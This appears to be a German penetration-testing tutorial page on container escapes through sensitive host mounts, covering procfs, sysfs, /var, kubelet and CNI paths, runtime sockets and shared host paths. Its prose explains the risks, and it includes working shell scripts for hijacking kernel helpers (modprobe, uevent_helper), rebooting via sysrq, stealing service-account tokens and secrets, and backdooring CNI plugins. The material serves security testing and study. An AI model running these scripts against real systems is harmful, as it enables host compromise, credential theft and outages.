# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host-Mounts gehören zu den wichtigsten praktischen Angriffsflächen für Container-Escapes, da sie die sorgfältig isolierte Sicht eines Prozesses häufig wieder auf die direkte Sichtbarkeit von Host-Ressourcen zurückführen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, von kubelet verwalteten Zuständen oder gerätebezogenen Pfaden können Kernel-Steuerungen, Zugangsdaten, Dateisysteme benachbarter Container und Runtime-Verwaltungsschnittstellen offenlegen.

Diese Seite steht separat neben den einzelnen Schutzseiten, da das Missbrauchsmodell mehrere Bereiche umfasst. Ein beschreibbarer Host-Mount ist teilweise wegen der Mount-Namespaces gefährlich, teilweise wegen der User-Namespaces, teilweise wegen der Abdeckung durch AppArmor oder SELinux und teilweise wegen des konkreten offengelegten Host-Pfads. Wenn man das Thema eigenständig behandelt, lässt sich die Angriffsfläche viel einfacher einschätzen.

Vergleiche außerdem ein für den Host beschreibbares Verzeichnis mit dem entsprechenden Pfad in jedem Container. Wenn es über ein Verzeichnis mit ausführbaren Startskripten gemountet ist, kann ein Host-Benutzer mit niedrigeren Berechtigungen möglicherweise Code platzieren, den der Entrypoint eines Containers mit höheren Berechtigungen beim nächsten Neustart lädt. Prüfe die genaue Bind-Quelle und das Ziel, die Schreib- und Suchberechtigungen des Verzeichnisses, die Schleife des Entrypoints und die Anforderung an ausführbare Dateien, die Runtime-UID sowie einen tatsächlichen Neustartauslöser. Container-UID 0 entspricht nicht automatisch Host-UID 0; die User-Namespace-Zuordnung und die Mount-Richtlinie bestimmen die Auswirkungen auf den Host. Bei einer passiven Prüfung sollten Pfade und Berechtigungen gemeldet werden, ohne ein Skript zu schreiben oder die Workload neu zu starten.

Ein Linux-Container kann sich innerhalb einer Verwaltungs-VM befinden, die einen Teil eines separaten Windows-Host-Dateisystems freigibt. [VirtualBox Shared Folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) sind eine Möglichkeit, Host-Dateien in einem Gast sichtbar zu machen, doch root in dieser VM ist weiterhin eine andere Identität als ein Windows-Administrator. Wenn die Freigabe den privaten SSH-Schlüssel eines Benutzers lesbar macht, behandle das als Hinweis auf Zugangsdaten: Prüfe den genauen hostseitig eingebundenen Mount, den Besitz und Zugriff auf den Schlüssel, das zugehörige Konto und die **effektive** Authorized-Key-Richtlinie des Windows-SSH-Servers, bevor du zu dem Schluss kommst, dass sie eine Host-Anmeldung ermöglicht. Moderne [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement)-Installationen verwenden für Administratorkonten häufig eine separate Datei `administrators_authorized_keys`. Gib bei routinemäßigen Auflistungen keine Inhalte privater Schlüssel aus; Mount- und Schlüsselpfad-Metadaten reichen für eine passive Triage aus.

## Offenlegung von `/proc`

procfs enthält sowohl gewöhnliche Prozessinformationen als auch Kernel-Steuerungsschnittstellen mit weitreichenden Auswirkungen. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Sicht, die unerwartet beschreibbare proc-Einträge offenlegt, kann daher zur Offenlegung von Informationen, zu einem Denial of Service oder zur direkten Codeausführung auf dem Host führen.

Zu den besonders wertvollen procfs-Pfaden gehören:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (insbesondere `register` und `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Prüfe zunächst, welche besonders wertvollen procfs-Einträge sichtbar oder beschreibbar sind:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können bei Schreibzugriff zu Codeausführung auf dem Host führen. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind wertvolle Quellen zur Aufklärung für Kernel-Exploits. `sched_debug` und `mountinfo` geben Aufschluss über Prozesse, cgroups und Dateisystemkontext und können dabei helfen, das Layout des Hosts aus dem Container heraus zu rekonstruieren.

Der praktische Nutzen der einzelnen Pfade ist unterschiedlich. Sie alle so zu behandeln, als hätten sie dieselben Auswirkungen, erschwert die Triage:

- `/proc/sys/kernel/core_pattern`
  Bei Schreibzugriff ist dies einer der Pfade in procfs mit den schwerwiegendsten Auswirkungen, da der Kernel nach einem Absturz einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf eine Payload in seinem Overlay oder in einem eingebundenen Host-Pfad setzen kann, kann oft Codeausführung auf dem Host erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein konkretes Beispiel.
- `/proc/sys/kernel/modprobe`
  Dieser Pfad steuert den Userspace-Helfer, den der Kernel verwendet, wenn er die Logik zum Laden von Modulen aufrufen muss. Ist er aus dem Container heraus beschreibbar und wird im Host-Kontext interpretiert, kann er zu einer weiteren Primitive für Codeausführung auf dem Host werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helferpfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
  Dies ist üblicherweise keine direkte Escape-Primitive, kann aber durch die Umwandlung von OOM-Bedingungen in ein Kernel-Panic-Verhalten einen hostweiten Denial of Service verursachen.
- `/proc/sys/fs/binfmt_misc`
  Ist die Registrierungsschnittstelle beschreibbar, kann der Angreifer einen Handler für einen ausgewählten Magic Value registrieren und so Ausführung im Host-Kontext erlangen, wenn eine passende Datei ausgeführt wird.
- `/proc/config.gz`
  Nützlich für die Triage von Kernel-Exploits. Damit lässt sich feststellen, welche Subsysteme, Mitigations und optionalen Kernel-Funktionen aktiviert sind, ohne dass Metadaten zu Host-Paketen benötigt werden.
- `/proc/sysrq-trigger`
  Meist ein Denial-of-Service-Pfad, aber ein sehr schwerwiegender. Er kann den Host sofort neu starten, in eine Panic versetzen oder anderweitig beeinträchtigen.
- `/proc/kmsg`
  Gibt Nachrichten aus dem Kernel-Ringpuffer preis. Nützlich zur Host-Fingerprinting und Crash-Analyse sowie in manchen Umgebungen zum Leaken von Informationen, die für Kernel-Exploits hilfreich sind.
- `/proc/kallsyms`
  Wertvoll, wenn lesbar, da der Pfad Informationen zu exportierten Kernel-Symbolen offenlegt und dabei helfen kann, Annahmen zur Adress-Randomisierung bei der Entwicklung von Kernel-Exploits zu umgehen.
- `/proc/[pid]/mem`
  Dies ist eine direkte Schnittstelle zum Prozessspeicher. Wenn der Zielprozess unter den erforderlichen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Ändern des Speichers eines anderen Prozesses ermöglichen. Die tatsächlichen Auswirkungen hängen stark von Berechtigungen, `hidepid`, Yama und ptrace-Beschränkungen ab. Es ist daher ein mächtiger, aber bedingter Pfad.
- `/proc/kcore`
  Stellt eine Core-Image-ähnliche Ansicht des Systemspeichers bereit. Die Datei ist riesig und umständlich zu verwenden. Ist sie jedoch sinnvoll lesbar, deutet das auf eine stark exponierte Host-Speicheroberfläche hin.
- `/dev/kmem` und `/dev/mem`
  Dies sind historisch folgenreiche Schnittstellen zu **Geräten** für den direkten Speicherzugriff, keine procfs-Dateien. Auf vielen modernen Systemen fehlen sie oder sie sind stark eingeschränkt. Ein Container, der jedoch eine vom Host eingebundene Kopie öffnen kann, sollte diese Offenlegung als kritisch einstufen. Prüfe sie zusammen mit anderen sensiblen `/dev`-Mounts, statt nach den nicht existierenden Pfaden `/proc/kmem` oder `/proc/mem` zu suchen.
- `/proc/sched_debug`
  Leakt Informationen zu Scheduling und Tasks, die Host-Prozessidentitäten offenlegen können, selbst wenn andere Prozessansichten sauberer als erwartet erscheinen.
- `/proc/[pid]/mountinfo`
  Äußerst nützlich, um zu rekonstruieren, wo sich der Container tatsächlich auf dem Host befindet, welche Pfade durch Overlay bereitgestellt werden und ob ein beschreibbarer Mount Host-Inhalte oder nur die Container-Ebene enthält.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, verwende sie, um den Host-Pfad des Container-Dateisystems zu ermitteln:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Diese Befehle sind nützlich, da für eine Reihe von Host-Ausführungstricks ein Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umgewandelt werden muss.

### Beispiel: Einen `modprobe`-Helper-Pfad vorbereiten

Wenn `/proc/sys/kernel/modprobe` vom Container aus beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf eine vom Angreifer kontrollierte Payload umgeleitet werden. Das Overlay-Upper-Verzeichnis muss sich aus Sicht des Hosts auflösen lassen, und die Proof-Ausgabe muss in dieselbe für den Host sichtbare Container-Ebene zurückgeschrieben werden, falls der Container nicht auch das Host-`/tmp` einbindet:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Der genaue Auslöser hängt vom Ziel und vom Kernelverhalten ab und wird bewusst nicht geraten. Stelle den ursprünglichen Wert wieder her, bevor du das Lab verlässt. Entscheidend ist, dass ein beschreibbarer Helper-Pfad einen zukünftigen Kernel-Helper-Aufruf auf vom Angreifer kontrollierte Inhalte eines Host-Pfads umleiten kann. Ein fehlendes Overlay-`upperdir`, ein Pfad, den der Host nicht auflösen kann, ein schreibgeschützter Sysctl-Mount oder ein Kernel, der den ausgewählten Helper nie aufruft, unterbricht diese Kette.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn es um die Bewertung der Exploitability statt um einen sofortigen Escape geht:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Diese Befehle helfen dabei festzustellen, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Meldungen interessante Zustände offenlegen und welche Kernel-Funktionen oder Mitigations einkompiliert sind. Die Auswirkungen führen normalerweise nicht direkt zu einem Escape, können die Triage von Kernel-Schwachstellen aber erheblich verkürzen.

### Vollständiges Beispiel: Host-Neustart über SysRq

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Ansicht erreicht:

```bash
echo b > /proc/sysrq-trigger
```

Der Effekt ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Effekt, zeigt aber deutlich, dass die Offenlegung von procfs weit schwerwiegender sein kann als eine bloße Offenlegung von Informationen.

## `/sys`-Offenlegung

sysfs stellt große Mengen an Kernel- und Gerätezustand bereit. Einige sysfs-Pfade sind hauptsächlich für Fingerprinting nützlich, während andere die Ausführung von Hilfsprogrammen, das Geräteverhalten, die Konfiguration von Sicherheitsmodulen oder den Firmware-Zustand beeinflussen können.

Zu den besonders relevanten sysfs-Pfaden gehören:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten der Temperaturverwaltung und damit die Stabilität des Hosts in Umgebungen mit unzureichenden Schutzmaßnahmen beeinflussen. `/sys/kernel/vmcoreinfo` kann Informationen zu Crash-Dumps und zum Kernel-Layout leaken, die beim Low-Level-Fingerprinting des Hosts helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle für Linux Security Modules; unerwarteter Zugriff darauf kann daher MAC-bezogene Zustände offenlegen oder verändern. EFI-Variablenpfade können firmwaregestützte Boot-Einstellungen beeinflussen und sind damit wesentlich kritischer als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, da es ausdrücklich eine entwicklerorientierte Schnittstelle ist, an die deutlich geringere Sicherheitsanforderungen gestellt werden als an gehärtete, produktionsreife Kernel-APIs.

Jeder sysfs-Eintrag in dieser Liste ist **vom Kernel, der Konfiguration und der Hardware abhängig**. Bei aktuellen virtualisierten Knoten fehlen häufig `uevent_helper`, EFI-Variablen und Einträge für Temperaturgeräte vollständig. Halte einen nicht vorhandenen Pfad als negative Voraussetzung fest, statt anzunehmen, dass ein Beispiel aus einem anderen Kernel auch hier zutrifft.

Nützliche Befehle zur Überprüfung dieser Pfade sind:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die nur auf dem Host hätte verfügbar sein sollen.
- `/sys/kernel/debug` ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` eingebunden und les- oder beschreibbar ist, ist mit einer großen kernelbezogenen Angriffsfläche zu rechnen, deren genaues Risiko von den aktivierten Debug-Knoten abhängt.
- Die Offenlegung von EFI-Variablen ist seltener, hat aber große Auswirkungen, da sie firmwaregestützte Einstellungen statt gewöhnlicher Laufzeitdateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für die Stabilität des Hosts und die Interaktion mit der Hardware relevant, nicht für einen unkomplizierten Shell-artigen Escape.
- `/sys/kernel/vmcoreinfo` dient hauptsächlich der Host-Fingerabdruckerstellung und der Crash-Analyse und ist nützlich, um den Kernelstatus auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

`/sys/kernel/uevent_helper` ist abhängig von Kernel und Konfiguration und fehlt auf vielen aktuellen Systemen. Wenn die Datei existiert, beschreibbar ist und ein nutzbarer `uevent`-Trigger verfügbar ist, kann der Kernel einen vom Angreifer kontrollierten Helper ausführen. Die Proof-Ausgabe muss einen Pfad verwenden, der sowohl aus Sicht des Hosts als auch des Containers sichtbar ist:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Der Grund, warum das funktioniert, ist, dass der Helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald der Trigger ausgelöst wird, läuft der Helper im Host-Kontext und nicht innerhalb des aktuellen Containers. `/sys/class/mem/null/uevent` ist ein konkreter Trigger auf Kerneln, die diese Datei bereitstellen. Andere Geräte können eigene `uevent`-Dateien bereitstellen, aber wähle auf echter Hardware nicht blind eine davon aus. Stelle den ursprünglichen Wert wieder her, bevor du die Lab-Umgebung verlässt. Gib diese Technik nicht als verfügbar an, wenn die Helper-Datei oder ein kontrollierter Trigger fehlt.

## `/var`-Freigabe

Das Einbinden des Host-`/var` in einen Container wird oft unterschätzt, weil es nicht so dramatisch wirkt wie das Einbinden von `/`. In der Praxis kann es ausreichen, um auf Runtime-Sockets, Container-Snapshot-Verzeichnisse, von kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und benachbarte Anwendungsdateisysteme zuzugreifen. Auf modernen Nodes befindet sich unter `/var` oft der betrieblich interessanteste Container-Zustand.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann oft die projizierten Tokens anderer Pods und Inhalte von Overlay-Snapshots lesen:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Diese Befehle sind nützlich, weil sie zeigen, ob der Mount nur belanglose Anwendungsdaten oder sensible Cluster-Zugangsdaten preisgibt. Ein lesbares Service-Account-Token kann lokalen Codeausführungszugriff unmittelbar in Zugriff auf die Kubernetes-API verwandeln.

Wenn das Token vorhanden ist, prüfe, worauf damit zugegriffen werden kann, statt bei der Entdeckung des Tokens stehenzubleiben:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Die Auswirkungen können hier weit über den Zugriff auf den lokalen Node hinausgehen. Ein Token mit weitreichenden RBAC-Berechtigungen kann aus einem eingebundenen `/var` eine clusterweite Kompromittierung machen.

### Docker- und containerd-Beispiel

Auf Docker-Hosts liegen die relevanten Daten oft unter `/var/lib/docker`. Auf Kubernetes-Nodes mit containerd können sie sich unter `/var/lib/containerd` oder in snapshotter-spezifischen Pfaden befinden:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Wenn das eingebundene `/var` beschreibbare Snapshot-Inhalte eines anderen Workloads offenlegt, kann der Angreifer möglicherweise Anwendungsdateien ändern, Webinhalte platzieren oder Startskripte ändern, ohne die Konfiguration des aktuellen Containers anzufassen.

Bei einem **wegwerfbaren Lab-Workload** können beschreibbare Snapshot-Inhalte dazu dienen, Manipulationen an Anwendungen, die Wiederherstellung von Secrets oder Lateral Movement zu demonstrieren. Ordne zuerst die Runtime-Container-ID dem exakten Snapshot zu und bearbeite niemals einen nicht zugehörigen oder produktiven Snapshot:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Diese Befehle sind nützlich, weil sie die drei wichtigsten Auswirkungsbereiche eines gemounteten `/var` aufzeigen: Manipulation von Anwendungen, Wiederherstellung von Secrets und laterale Bewegung in benachbarte Workloads.

Direkte Schreibzugriffe auf Snapshots umgehen die normale Zustandsverwaltung der Runtime und können den Container beschädigen oder Beweise vernichten. Die rein lesende Suche wurde lokal mit Docker `overlay2` reproduziert: Ein Marker, der in einen benachbarten Wegwerf-Container geschrieben wurde, erschien unter `/var/lib/docker/overlay2/<id>/diff/`. Beschränke die tatsächliche Änderung von Snapshots auf einen für diesen Test erstellten Wegwerf-Container.

## Kubelet-Status, Plugins und CNI-Pfade

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` wird häufig über privilegierte DaemonSets, CNI-Agents, CSI-Node-Plugins, GPU-Operatoren und Storage-Helfer bereitgestellt. Diese Mounts lassen sich leicht als „Node-Infrastruktur“ abtun, doch sie liegen direkt im Ausführungspfad neuer Pods und enthalten oft Kubelet-Anmeldedaten, projizierte Secrets, Registrierungssockets und ausführbare hostseitige Plugin-Binärdateien.

Zu den besonders wertvollen Zielen gehören:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche Prüfungsbefehle sind:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet-Clientzertifikate und andere node-lokale Zugangsdaten offenlegen, die je nach Cluster-Design manchmal gegenüber dem API-Server oder kubelet-seitigen TLS-Endpunkten wiederverwendet werden können.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` enthält häufig projizierte Service-Account-Tokens und eingebundene Secrets für benachbarte Pods auf demselben Node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ist vor allem eine Reconnaissance-Fläche, aber eine sehr nützliche: Sie zeigt, welche Pods und Container derzeit GPUs, Hugepages, SR-IOV-Geräte und andere knappe node-lokale Ressourcen belegen.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI-, DRA- und Device-Plugins installiert sind und mit welchen Sockets der kubelet kommunizieren soll. Sind diese Verzeichnisse beschreibbar statt nur lesbar, wird der Befund deutlich schwerwiegender.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt auf dem Pfad zur Einrichtung des Pod-Netzwerks. Schreibzugriff darauf ist oft ein verzögerter Mechanismus zur Host-Ausführung und nicht bloß die Offenlegung von Konfigurationen.<sup>[[2]](#references)</sup>

### Vollständiges Beispiel: Beschreibbares `/opt/cni/bin`

Wenn ein Host-CNI-Binärverzeichnis schreibgeschützt eingebunden ist, kann das Ersetzen eines Plugins ausreichen, um beim nächsten Erstellen einer Pod-Sandbox durch den kubelet auf diesem Node Host-Ausführung zu erlangen:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Dies ist nicht so unmittelbar wie ein gemounteter `docker.sock`, aber in kompromittierten Kubernetes-Infrastruktur-Pods oft realistischer. Der Marker wird neben dem gemounteten Plugin abgelegt, sodass der Container ihn abrufen kann, selbst wenn weder ein Host-Root- noch ein Host-`/tmp`-Mount vorhanden ist. Der Wrapper behält die ursprünglichen Argumente und die Standardeingabe bei. Anschließend stellt das Beispiel die ursprüngliche Binärdatei wieder her. Entscheidend ist, dass die modifizierte Binärdatei später vom Host-Netzwerkeinrichtungsprozess ausgeführt wird, nicht vom aktuellen Container. Verwende ausschließlich einen entbehrlichen Node, da ein ungültiger Wrapper verhindern kann, dass neue Pod-Sandboxes Netzwerkzugriff erhalten.

## Laufzeit-Sockets

Sensible Host-Mounts umfassen oft Runtime-Sockets statt vollständiger Verzeichnisse. Diese sind so wichtig, dass sie hier ausdrücklich noch einmal erwähnt werden sollten:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploit-Abläufe, sobald einer dieser Sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Wenn eines davon gelingt, ist der Weg vom „gemounteten Socket“ zum „Starten eines privilegierteren Geschwistercontainers“ in der Regel deutlich kürzer als jeder Kernel-Breakout-Pfad.

Derselbe Daemon-Zugriff kann auch **Persistenz auf dem Host** ermöglichen. Ein Hilfscontainer mit einem beschreibbaren Bind Mount auf das Host-Root-Dateisystem kann Dateien über `docker cp` empfangen und anschließend mit `docker exec` einen SSH-Schlüssel, eine Service-Unit oder eine andere Persistenzdatei im gemounteten Host-Pfad ablegen. Die Sicherheitsgrenze ist die Berechtigung des Daemons, den Host-Mount anzulegen; `docker cp` dient lediglich als Zwischenschritt. Prüfe sowohl neu erstellte Container als auch Schreibzugriffe auf Authentifizierungs- oder Startpfade des Hosts, nachdem ein Runtime-Socket offengelegt wurde.

## Hijacking von Tasks über beschreibbare Host-Pfade

Ein beschreibbarer Host-Mount muss nicht `/` offenlegen, um gefährlich zu sein. Wenn der gemountete Pfad Skripte, Konfigurationsdateien, Hooks, Plugins oder Dateien enthält, die später von einer geplanten Task oder einem Dienst auf dem Host verwendet werden, kann der Container möglicherweise ändern, was der Host ausführt.

Allgemeiner Prüfablauf:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Wenn eine beschreibbare Datei von einem Host-Prozess verwendet wird, halte die Payload beim Testen einfach und beobachtbar:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Der interessante Teil ist die Vertrauensgrenze: Der Schreibvorgang erfolgt innerhalb des Containers, die Ausführung jedoch später im Kontext eines Host-Dienstes. Dadurch wird ein eng begrenzter hostPath oder Bind-Mount zu einem verzögerten Primitiv zur Host-Codeausführung.

## Root-eigene Dateien auf einem gemeinsam genutzten Host-Pfad

Ein Containerkonto, das zu root werden kann, kann möglicherweise eine root-eigene Datei auf einem beschreibbaren Pfad ablegen, der auch vom Host verwendet wird. Wenn Container-UID 0 auf Host-UID 0 abgebildet wird, verweisen beide Ansichten auf dieselbe Datei und der Host-Mount SUID-Ausführung zulässt, kann ein Host-Benutzer, der eine root-eigene SUID-Executable auf diesem Pfad ausführen kann, die Host-Privilegiengrenze überschreiten. Für dieses spezielle Problem mit Dateieigentümerschaft muss der Container nicht mit `--privileged` laufen. Siehe [user namespace mappings](protections/namespaces/user-namespace.md) und die [SUID discussion](privileged-containers.md) zu den jeweils gesonderten Bedingungen.

Untersuche den Pfad **von beiden Seiten**: Vergleiche Eigentümerschaft und Identität einer harmlosen Datei, prüfe `uid_map` und `gid_map` des Containers und untersuche die Mount-Optionen und Ausführungsrichtlinien des Hosts. `rw` auf der Containerseite ohne `nosuid` ist lediglich ein möglicher Ansatzpunkt; daraus lassen sich weder Host-Eigentümerschaft noch Host-Mount-Flags, der Zugriff eines Host-Benutzers oder eine mögliche Blockierung der Ausführung durch AppArmor/SELinux ableiten. `noexec` beschränkt die Ausführung in der Ansicht, für die es gilt. Die Tags `shared:` und `master:` in `/proc/self/mountinfo` beschreiben die Mount-Propagation, nicht ob der Dateiinhalt mit dem Host geteilt wird. Ein Bind-Mount kann diese Tags nicht aufweisen. Die Wiederverwendung von Zugangsdaten für eine Host-Anmeldung ist ein separater Schritt und nicht Teil der Privilegiengrenze durch gemeinsam genutzte Dateien.

Der Laufzeitspeicher des Hosts kann auch ohne expliziten Bind-Mount einen ähnlichen Pfad schaffen. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) ermöglichte einem unprivilegierten Host-Benutzer, Docker-Datenunterverzeichnisse zu durchlaufen und Dateien aus einem Container-Dateisystem auszuführen; Moby korrigierte die Berechtigungen in Version 20.10.9 und weist darauf hin, dass laufende Container neu gestartet werden müssen, um ihre Verzeichnisse zu korrigieren. Untersuche die konkreten eingebundenen Pfade `overlay2/<id>/merged` und die Suchberechtigungen jedes übergeordneten Verzeichnisses. Stelle anschließend fest, ob Container-UID 0 auf Host-UID 0 abgebildet wird, ob eine echte root-eigene SetUID-Executable vorhanden und erreichbar ist und ob die Host-Ansicht SetUID-Ausführung zulässt. Rootless- oder user-namespace-remapped-Container, `nosuid`, `noexec`, `no_new_privs` und MAC-Richtlinien können das Ergebnis beeinflussen. Eine Laufzeitversion oder ein durchsuchbarer Pfad allein ist ein Ansatzpunkt für eine Untersuchung, aber kein Beweis für die Ausführung mit Host-root-Rechten. Untersuche 